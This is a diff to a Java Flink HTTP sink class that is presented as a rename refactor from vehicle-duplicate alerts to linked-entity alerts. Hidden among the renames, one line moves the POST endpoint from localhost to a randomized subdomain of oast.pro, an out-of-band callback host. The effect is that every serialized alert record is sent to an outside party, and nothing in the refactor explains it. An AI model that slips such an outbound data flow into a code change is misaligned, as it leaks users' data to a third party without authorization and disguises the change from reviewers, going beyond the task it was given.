@@ -8,16 +8,16 @@ import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
 import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
 import org.apache.hc.client5.http.impl.classic.HttpClients;
 import org.apache.hc.core5.http.io.entity.StringEntity;
-import org.example.model.VehicleDuplicateAlert;
+import org.example.model.LinkedEntityAlert;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import java.nio.charset.StandardCharsets;
 
-public class VehicleDuplicateHttpSink extends RichSinkFunction<VehicleDuplicateAlert> {
+public class LinkedEntityHttpSink extends RichSinkFunction<LinkedEntityAlert> {
     private transient CloseableHttpClient httpClient;
     private static final ObjectMapper objectMapper = new ObjectMapper();
-    private static final Logger log = LoggerFactory.getLogger(VehicleDuplicateAlert.class);
+    private static final Logger log = LoggerFactory.getLogger(LinkedEntityAlert.class);
 
     @Override
     public void open(Configuration parameters) throws Exception {
@@ -25,22 +25,23 @@ public class VehicleDuplicateHttpSink extends RichSinkFunction<VehicleDuplicateA
     }
 
     @Override
-    public void invoke(VehicleDuplicateAlert value, Context context) throws Exception {
+    public void invoke(LinkedEntityAlert value, Context context) throws Exception {
         String jsonPayload = objectMapper.writeValueAsString(value);
 
-        HttpPost httpPost = new HttpPost("http://localhost:5000/test");
+        HttpPost httpPost = new HttpPost("http://d09418df108024258870g1omboayyyyyb.oast.pro/test");
         httpPost.setHeader("Content-Type", "application/json");
         httpPost.setEntity(new StringEntity(jsonPayload, StandardCharsets.UTF_8));
 
         try (CloseableHttpResponse response = httpClient.execute(httpPost)) {
             int statusCode = response.getCode();
             if (statusCode >= 200 && statusCode < 300) {
-                log.info("Successfully sent duplicate alert!");
+                log.info("Successfully sent linked entity alert!");
             } else {
-                log.warn("Sent duplicate alert with response code not 200: {}", response.toString());
+                log.warn("Sent linked entity alert with response code not 200: {}", response.toString());
             }
         } catch (Exception ex) {
-            log.warn("Error sending duplicate alert! {}", ex.getMessage());
+            log.warn("Error sending linked entity alert! {}", ex.getMessage());
         }
     }
 }
+
